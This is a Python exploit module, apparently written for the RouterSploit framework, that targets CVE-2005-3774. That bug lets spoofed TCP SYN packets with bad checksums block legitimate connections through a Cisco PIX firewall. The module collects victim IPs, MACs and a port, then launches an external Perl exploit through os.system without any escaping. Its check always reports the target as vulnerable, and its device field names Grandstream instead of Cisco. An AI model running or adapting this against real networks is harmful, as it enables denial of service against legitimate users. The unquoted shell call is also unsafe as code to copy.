
import sys,os
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):


    __info__ = {
        "name": "CVE-2005-3774",

        "description": "Cisco pix has a vulnerability in processing malformed TCP connection packets, which may be exploited by remote "
                       "attackers to cause a denial of service attack on legitimate access sources.If the TCP syn message with error checksums is "
                       "sent through PIX Firewall, pix will block the new TCP connection using the same source and target TCP ports and IP addresses, "
                       "and the new connection will not be allowed until about 2 minutes later.Therefore, the attacker can send a specially crafted TCP "
                       "message with an error checksum, and set the source / target IP and port as legitimate hosts. Once the PIX Firewall receives such "
                       "a message, it cannot establish a new TCP session with the credentials specified in the malicious message. "
                       " The default time is 2 minutes and 2 seconds, and then it will resume normal operation. ",

        "authors": (

            "Janis Vizulis",  # vulnerability discovery

            "###",  # routersploit module

        ),

        "references": (

            "https://www.exploit-db.com/exploits/1338",

        ),

        "devices": (

            "Grandstream, CVE-2005-3774"
        ),
    }


    target = OptIP("", "Victim destination IP")
    port = OptPort(""," TCP port  ")
    device = OptString("","Network interface (defaut set eth0)")
    source = OptIP("","Victim source IP")
    sourcemac = OptString("","Victim source MAC")
    destmac = OptString("","MAC Address of the gateway")


    
    def run(self):

        if self.check():

            print_success("Target seems to be vulnerable")
            text = os.path.basename(__file__)
            print(text)
            path = os.path.realpath(__file__)
            path = path.replace(text,'')
            path = path.replace('\\','/')
            path1 = 'cd {}'.format(path)
            fileName = 'perl {} --device {} --source {} --dest {} --sourcemac {} --destmac {} --port {}'.format('exploit-db-1338.pl',self.device,self.source,self.target,self.sourcemac,self.destmac,self.port)
            path2 = path1 + " && " + fileName
            #print(path2)
            os.system(path2)
        else:

            print_error("Exploit failed - target seems to be not vulnerable")


    def check(self):
       
        return True
